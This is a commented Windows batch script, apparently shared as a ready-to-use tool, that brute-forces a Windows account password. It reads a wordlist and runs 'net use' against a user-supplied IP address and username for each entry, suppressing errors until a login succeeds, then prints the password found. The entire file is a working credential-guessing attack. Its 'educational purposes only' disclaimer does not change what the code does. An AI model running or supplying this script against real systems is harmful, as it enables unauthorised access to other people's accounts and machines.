:: The following Batch program is a password cracking tool that takes a list of commonly used passwords before going through each in an attempt to crack the user's account password
:: DISCLAIMER: TO BE USED RESPONSIBLY AND FOR EDUCATIONAL PURPOSES ONLY, THE DEVELOPER IS NOT LIABLE FOR ANY MISUSE OF THE PROGRAM
@echo off
title Password Cracker
echo.
:: Requests the user to input in the IP address of their choice along with the username and text file extension for their password list
set /p ip="Please enter the IP address: "
set /p username="Please enter the username: "
set /p passwordlist="Please enter the password list: "
:: Initializes a counter to keep track of the total number of attempts
set /a count=0
:: For each line in the password list, the attempting password is set as it and an attempt is made
for /f %%a in (%passwordlist%) do (
	set password=%%a
	call :attempt
)
:: If all passwords are attempted and the success subroutine hasn't been triggered, the program informs the user the password was not found and ends
echo Password Not Found
pause
exit
:: In the event the password is a success, the program surpresses all outputs and errors before informing the user and disconnects the user from any existing connection to the target IP before exiting
:success
echo.
echo Password Successfully Found: %password%
net use \\%ip% /d /y >nul 2>&1
pause
exit
:: The program attempts the given username and password in the command line, surpressing all outputs and errors
:attempt
net use \\%ip% /user:%username% %password% >nul 2>&1
:: The attempt number with the attempted password is outputed to the user and the attempts counter is incremented
echo [Attempt %count%] [%password%]
set /a count=%count%+1
:: If no error occurs (i.e. The error level is 0 signifiying a success) the success subroutine is triggered
if %errorlevel% EQU 0 goto success